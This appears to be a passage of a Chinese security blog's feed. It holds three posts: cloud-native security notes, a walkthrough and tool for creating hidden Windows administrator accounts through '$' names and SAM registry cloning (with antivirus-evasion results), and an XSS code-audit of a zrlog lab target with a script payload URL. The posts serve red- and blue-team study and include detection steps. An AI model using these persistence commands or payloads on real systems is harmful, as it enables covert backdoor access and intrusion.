title="云原生安全"></a>云原生安全</h2><p>在介绍完云原生后，云原生安全就变得容易理解了，云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。</p><p>根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：</p><ul><li><p>容器安全</p></li><li><p>编排系统安全</p></li><li><p>云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等</p></li></ul><p>另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：</p><p>《云原生安全-攻防实践与体系构建》</p><p><a href="https://www.jianshu.com/p/a37baa7c3eff">https://www.jianshu.com/p/a37baa7c3eff</a></p><p><a href="https://www.51cto.com/article/652294.html">https://www.51cto.com/article/652294.html</a></p><p><a href="https://jimmysong.io/kubernetes-handbook/cloud-native/cncf.html">https://jimmysong.io/kubernetes-handbook/cloud-native/cncf.html</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E6%9C%8D%E5%8B%99">https://zh.wikipedia.org/wiki/%E5%BE%AE%E6%9C%8D%E5%8B%99</a></p><p><a href="https://www.redhat.com/zh/topics/cloud-native-apps/what-is-serverless">https://www.redhat.com/zh/topics/cloud-native-apps/what-is-serverless</a></p><p><a href="https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh">https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh</a></p><p><a href="https://decodezp.github.io/2020/05/23/quickwords43-what-is-cloudnative/">https://decodezp.github.io/2020/05/23/quickwords43-what-is-cloudnative</a></p><p><a href="https://www.redhat.com/zh/topics/containers/what-is-container-orchestration">https://www.redhat.com/zh/topics/containers/what-is-container-orchestration</a></p><p><a href="https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html">https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html</a></p><p><a href="https://www.cncf.io/announcements/2015/06/21/new-cloud-native-computing-foundation-to-drive-alignment-among-container-technologies/">https://www.cncf.io/announcements/2015/06/21/new-cloud-native-computing-foundation-to-drive-alignment-among-container-technologies/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在接触云原生安全的时候碰到了不少以前不知道、不熟悉的名词、技术等等，故在此做个笔记记录一下。&lt;/</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】一键创建隐藏账号</title>
    <link href="https://www.teamssix.com/220118-134825.html"/>
    <id>https://www.teamssix.com/220118-134825.html</id>
    <published>2022-01-18T05:48:25.000Z</published>
    <updated>2022-02-17T08:07:18.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在对以前所做的笔记进行梳理的时候，发现还没记录过隐藏账号的笔记，这里就补充一下。</p><p>在补充的过程中发现，利用注册表创建隐藏账号的方法还是挺繁琐的，虽然已经有一键化的工具，但是使用起来都不是太顺手，另外在使用某款工具的过程中还把我虚拟机干炸了，幸好打的有快照。</p><p>既然没有顺手的，那就自己写一个吧，不过在此之前，还是先看看手动是怎么创建隐藏账号的。</p><h1 id="0x01-手动创建隐藏账号与发现的方法"><a href="#0x01-手动创建隐藏账号与发现的方法" class="headerlink" title="0x01 手动创建隐藏账号与发现的方法"></a>0x01 手动创建隐藏账号与发现的方法</h1><h2 id="方法一：添加-符"><a href="#方法一：添加-符" class="headerlink" title="方法一：添加 $ 符"></a>方法一：添加 $ 符</h2><p>添加隐藏用户并添加到管理员组</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ Passw0rd <span class="token operator">/</span>addnet localgroup administrators teamssix$ <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181400117.png"></p><p>在使用 net user 查看当前用户时，是看不到这个用户的，但是在控制面板里可以看到该用户</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401187.png"></p><p>使用 wmic 也能看到该用户</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">wmic useraccount get Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402599.png"></p><p>删除该用户直接用 net user 即可</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><h2 id="方法二：修改注册表"><a href="#方法二：修改注册表" class="headerlink" title="方法二：修改注册表"></a>方法二：修改注册表</h2><p>打开注册表</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">HKEY_LOCAL_MACHINE\SAM\SAM\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>赋予管理员用户完全控制的权限</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402115.png"></p><p>关闭注册表，再次来到刚才的路径，这时就可以看到 SAM 文件夹里的内容了</p><p>这时需要导出三个文件：</p><ul><li>Users 下的管理员文件</li><li>Users 下的隐藏账号文件</li><li>Names 下的隐藏账号文件</li></ul><p>Users 下的文件名可能不太好判断归属那个用户，不过在选择 Names 下的用户时，可以看到相应的类型值，比如 teamssix$ 账号对应的是 0x3ea，那么 Users 下的文件夹就是 000003EA，同理找到管理员 Administrator 对应的是 00001F4</p><p>找到这三个文件后，右击选择导出</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402156.png"></p><p>使用记事本打开导出的 Users 下的两个文件，将 Administrator 中的 F 键值内容进行替换到 teamssix$ 中</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403665.png"></p><p>然后删除 teamssix$ 用户</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><p>这个时候其实 teamssix$ 用户就被删掉了，然后利用刚才的注册表文件再添加上 teamssix$ 用户</p><p>双击刚才导出的 Users 下的 teamssix$ 文件和 Names 下的 teamssix$ 文件。</p><p>此时，利用注册表新建隐藏账号就做好了，不管是 net user 还是控制面板都看不到该用户。</p><p>使用 net user teamssix$ 能看到该用户，说明该用户是存在的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403858.png"></p><p>从上面图片可以看到其实账号是禁用的状态，因此想使用这个账号，还得给它启用才行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>active<span class="token punctuation">:</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除这个账号，在注册表中删除 Users 下的 000003EA 和 Names 下的 teamssix$ 就行了。</p><p>不过这种方法依然是有破绽的，比如在注册表里还是能发现 teamssix$ 用户的，使用 wmic 也能看到该用户。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404578.png"></p><p>而且当电脑重启后，在计算机管理里也能看到刚刚创建的隐藏账号。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404120.png"></p><h1 id="0x02-创建隐藏账号的工具介绍"><a href="#0x02-创建隐藏账号的工具介绍" class="headerlink" title="0x02 创建隐藏账号的工具介绍"></a>0x02 创建隐藏账号的工具介绍</h1><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>对比了下两种方法，虽然都有办法去发现隐藏账号，但是第二种修改注册表的方法很明显隐藏性还是更好些，只是操作起来有些麻烦，但是又没有什么用着顺手的工具，所以这里自己写了一个利用注册表添加隐藏账号的小工具。</p><p><strong>免责声明：请勿将工具用于非法用途，开发人员不承担任何责任，也不对任何滥用或损坏负责。</strong></p><p>工具地址：<a href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405087.png">命令帮助信息</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">-</span>c 检查当前系统的隐藏账户<span class="token operator">-</span>d 指定要删除的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $<span class="token operator">-</span>p 指定添加的用户的密码<span class="token operator">-</span>u 指定要添加的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>例如这里添加一个用户名为 teamssix 的隐藏账号，工具会自动在用户名后添加 $ 符，因此创建后的用户名为 teamssix$</p><p>使用的时候，记得在管理员权限下运行，不然会提示权限不足</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>u teamssix <span class="token operator">-</span>p Passw0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405373.png"></p><p>创建完后，通过 net user 和控制面板等等都是看不到这个账号的</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406619.png"></p><p>检查当前系统的隐藏账号</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406908.png"></p><p>删除 teamssix 隐藏账号，当删除完账号后，再次检查当前系统的隐藏账号，可以看到就提示没有隐藏账号了</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406722.png"></p><h2 id="免杀能力"><a href="#免杀能力" class="headerlink" title="免杀能力"></a>免杀能力</h2><p>因为在工具里是利用 Windows API 创建的用户，所以天然具有一定的免杀能力，不过因为工具里需要对注册表进行操作，所以还是会被杀软发现。</p><p>我这里用 360 和火绒测试了下免杀的能力，情况大体如下：</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406221.png"></p><p>整体上，除了在添加用户的时候，360 会弹窗询问要不要允许修改注册表外，其他时候杀软都是没动静的，个人觉着还行。</p><p>不过这个也只是我当时的检测情况，也许明天后天就会被查杀，这个也是很正常的事儿。</p><h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><p>我看到一些同类工具只有添加隐藏账号的功能，这个工具除了添加隐藏账号外，我还给它也加入了检查隐藏账号和删除隐藏账号的功能，这样不管是红队还是蓝队，都可以使用到这款工具。</p><p>最后，如果有什么 bug 可以直接在 Github 的项目地址上给我提 issue，另外 Star 就不要了，你懂的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在对以前所做的笔记进行梳理的时候，发现还没记录过隐藏账号的笔记，这里就补充一下。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    <category term="蓝队" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】跨站脚本 XSS</title>
    <link href="https://www.teamssix.com/211220-164519.html"/>
    <id>https://www.teamssix.com/211220-164519.html</id>
    <published>2021-12-20T08:45:19.000Z</published>
    <updated>2021-12-21T07:18:39.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-反射型-XSS"><a href="#0x01-反射型-XSS" class="headerlink" title="0x01 反射型 XSS"></a>0x01 反射型 XSS</h1><p>以下代码展示了反射型 XSS 漏洞产生的大概形式</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> studentId <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"sid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name = "</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"studentId = "</span><span class="token operator">+</span>studentId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当访问 <a href="http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&sid=alert(1)">http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&amp;sid=%3Cscript%3Ealert(1)%3C/script%3E</a> 时，就会触发 XSS 代码</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646020.png"></p><h1 id="0x02-存储型-XSS"><a href="#0x02-存储型-XSS" class="headerlink" title="0x02 存储型 XSS"></a>0x02 存储型 XSS</h1><p>这里以 zrlog v1.9.1.0227 靶场进行示例</p><h2 id="部署靶场"><a href="#部署靶场" class="headerlink" title="部署靶场"></a>部署靶场</h2><p>靶场 war 包下载地址：<a href="http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war">http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war</a></p><p>安装参考官方安装文档即可：<a href="https://blog.zrlog.com/post/how-to-install-zrlog">https://blog.zrlog.com/post/how-to-install-zrlog</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>来到后台，编辑标题处，在标题的位置插入 XSS 语句</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646981.png"></p><p>访问主页，可以看到 XSS 语句被执行</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646003.png"></p><p>通过抓包可以看到提交 XSS 语句时的 URL 为 /api/admin/website/update</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看该项目的 Web.xml 可以看到通过类 com.zrlog.web.config.ZrLogConfig 进行访问控制</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>configClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>com.zrlog.web.config.ZrLogConfig<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 查看 WEB-INF/classes/com/zrlog/web/config/ZrLogConfig.class 文件</p><p>可以看到这份源码的路由配置信息</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configRoute</span><span class="token punctuation">(</span><span class="token class-name">Routes</span> routes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">,</span> <span class="token class-name">APIController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/install"</span><span class="token punctuation">,</span> <span class="token class-name">InstallController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看 AdminRoutes() 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">AdminRoutes</span> <span class="token keyword">extends</span> <span class="token class-name">Routes</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminPageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">AdminTemplatePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">AdminArticlePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/link"</span><span class="token punctuation">,</span> <span class="token class-name">LinkController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/comment"</span><span class="token punctuation">,</span> <span class="token class-name">CommentController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/tag"</span><span class="token punctuation">,</span> <span class="token class-name">TagController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/type"</span><span class="token punctuation">,</span> <span class="token class-name">TypeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/nav"</span><span class="token punctuation">,</span> <span class="token class-name">BlogNavController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">ArticleController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/website"</span><span class="token punctuation">,</span> <span class="token class-name">WebSiteController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">TemplateController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upload"</span><span class="token punctuation">,</span> <span class="token class-name">UploadController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upgrade"</span><span class="token punctuation">,</span> <span class="token class-name">UpgradeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 16 行可以看到 /api/admin/website 对应到 WebSiteController 类</p><p>查看 WebSiteController 类的代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WebSiteSettingUpdateResponse</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> requestMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">ZrLogUtil</span><span class="token punctuation">.</span><span class="token function">convertRequestBody</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> requestMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> param <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WebSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>param<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> param<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">WebSiteSettingUpdateResponse</span> updateResponse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSiteSettingUpdateResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    updateResponse<span class="token punctuation">.</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> updateResponse<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 2 行可以看到，update 方法会把传输过来的数据存储到 requestMap 对象里，并通过 updateByKV 方法进行数据更新。</p><p>因此这里需要对 updateByKV 进行分析，判断其有没有对输入内容进行过滤。</p><p>查看 updateByKV 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">queryInt</span><span class="token punctuation">(</span><span class="token string">"select siteId from "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" where name=?"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"update "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" set value=? where name=?"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"insert "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">"(`value`,`name`) value(?,?)"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里并没有对数据进行过滤，直接将数据存储到了数据库里。</p><p>接下来分析一下输出的地方</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token 